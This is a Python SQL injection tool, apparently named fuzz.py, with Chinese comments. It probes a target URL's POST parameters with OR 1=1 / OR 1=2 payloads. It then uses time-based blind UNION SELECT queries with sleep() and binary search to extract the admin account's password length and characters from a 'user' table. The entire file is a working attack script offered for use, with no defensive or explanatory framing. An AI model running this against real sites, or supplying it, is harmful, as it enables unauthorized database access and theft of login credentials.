import requests
from urllib.parse import urlparse
import sys
import hashlib
import time
import math


def host_status(url):
    '''测试主机是否存活'''
    print('\033[0;32;40m [INFO] testing connection to the target URL')
    url_parse = urlparse(url)
    host = url_parse.hostname

    # 测试主机是否存活
    try:
        requests.get(url)
    except:
        print('\033[0;31;40m [ERROR] host {} does not exist'.format(host))
        exit(1)


def page_status(url):
    '''测试网页是否稳定'''
    print('\033[0;32;40m [INFO] testing if the target URL content is stable')

    m1 = hashlib.md5()
    r1 = requests.get(url)
    m1.update(r1.text.encode())

    if r1.status_code == 404:
        return False
    time.sleep(2)

    m2 = hashlib.md5()
    r2 = requests.get(url)
    m2.update(r2.text.encode())

    is_stable = (m1.hexdigest() == m2.hexdigest())
    return is_stable


def inject_detect(url, params):
    '''对各个参数做普通注入检测'''
    print('\033[0;32;40m [INFO] parameter inject detection')

    # 使用普通类型注入检测
    result = or_inject(url, params)

    # 使用基于时间的盲注检测
    result = time_base_inject(url, params)

    # 两种方法均不存在SQL注入，返回检测失败
    if result == False:
        print('\033[0;31;40m [INFO] there is no injection vulnerability')


def or_inject(url, params):
    print('\033[0;32;40m [INFO] ordinary SQL injecting')

    params = params.split('&')
    d = {}
    sql_inject = []
    for param in params:
        key = param.split('=')[0]
        value = param.split('=')[1]
        d.update({key: value})

    # 每个参数注入两次，比较前后两次页面是否有变化，如果有则此处存在普通SQL注入
    for key in d:
        # 保存原本的参数值
        old_value = d[key]

        # 计算修改参数后返回页面的md5，并保存
        d[key] = ' {}\' OR 1=1 --'.format(d[key])
        md5_1 = hashlib.md5()
        req1 = requests.post(url, data=d)
        md5_1.update(req1.text.encode())
        hex_md5_1 = md5_1.hexdigest()
        d[key] = old_value

        d[key] = ' {}\' OR 1=2 --'.format(d[key])
        md5_2 = hashlib.md5()
        req2 = requests.post(url, data=d)
        md5_2.update(req2.text.encode())
        hex_md5_2 = md5_2.hexdigest()
        d[key] = old_value

        if hex_md5_1 != hex_md5_2:
            sql = ' {}:{}\' OR 1=1 --'.format(key, d[key])
            sql_inject.append(sql)
        # 还原参数值
    if sql_inject == []:
        return False
    else:
        print('\033[0;37;40m -'*10)
        for param in sql_inject:
            param = param.split(':')
            info = '''\033[0;37;40mParameter: {} <POST>
            Type: ordinary inject
            Payload: {}={}\n'''.format(param[0], param[0], param[1])
            print(info)
        return True


def time_base_inject(url, params):
    print('\033[0;32;40m [INFO] time-based blind SQL injecting')

    # 尝试获取数据库登陆密码长度
    result = get_pwd_len(url, params)
    if result[0] == False:
        return False
    else:
        key = result[1]
        pwd_len = result[2]
        payload = result[3]
        print('\033[0;32;40m [INFO] get the password length')

    # 获取数据库登陆密码
    pwd = get_pwd(url, params, pwd_len)
    key = result[1]

    params = params.split('&')
    d = {}
    for param in params:
        key = param.split('=')[0]
        value = param.split('=')[1]
        d.update({key: value})
    info = '''\033[0;37;40mParameter: {} <POST>
    Type:  time-based blind injecting
    Payload: {}
    password={}\n'''.format(key, payload, pwd)
    print(info)
    return True


def get_pwd_len(url, params):
    # 参数处理
    params = params.split('&')
    d = {}
    for param in params:
        key = param.split('=')[0]
        value = param.split('=')[1]
        d.update({key: value})

    low, high = 0, 256
    value = ''' {} \' union select
                case when length(password) > %d
                then 0
                else sleep(1)
                end
                from user where username = 'admin' --'''

    # 二分查找法获取数据库信息
    for key in d:
        old_value = d[key]
        value = value.format(d[key])
        mid = 0
        while True:
            old_mid = mid
            mid = math.ceil((low + high) / 2)
            d[key] = value % (mid)
            r = requests.post(url, data=d)
            response_time = r.elapsed.total_seconds()
            if response_time < 1:
                low = mid
            elif response_time > 1:
                high = mid
            if mid == old_mid:
                break
        if mid != 256:
            return [True, key, mid, d[key]]
        d[key] = old_value
    return [False]


def get_pwd_chr(url, params, n):
    params = params.split('&')
    d = {}
    for param in params:
        key = param.split('=')[0]
        value = param.split('=')[1]
        d.update({key: value})

    low, high = 0, 256
    value = '''{}\' union select
    case when ascii(substr(password, %d, 1)) > %d
    then 0
    else sleep(1)
    end
    from user where username = 'admin' --'''

    # 二分查找法获取数据库信息
    for key in d:
        old_value = d[key]
        value = value.format(d[key])
        mid = 0
        while True:
            old_mid = mid
            mid = math.ceil((low + high) / 2)
            d[key] = value % (n, mid)
            r = requests.post(url, data=d)
            response_time = r.elapsed.total_seconds()
            if response_time < 1:
                low = mid
            elif response_time > 1:
                high = mid
            if mid == old_mid:
                break
        d[key] = old_value
    return chr(mid)


def get_pwd(url, params, length):
    pwd = ''
    for n in range(length):
        c = get_pwd_chr(url, params, n+1)
        pwd += c
    return pwd


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print('usage: python3 fuzz.py <url> <form_data=data>')
        exit(1)
    url = sys.argv[1]
    params = sys.argv[2]
    host_status(url)
    is_stable = page_status(url)
    if is_stable:
        inject_detect(url, params)
    else:
        print('\033[0;31;40m [INFO] the target URL content is not stable')
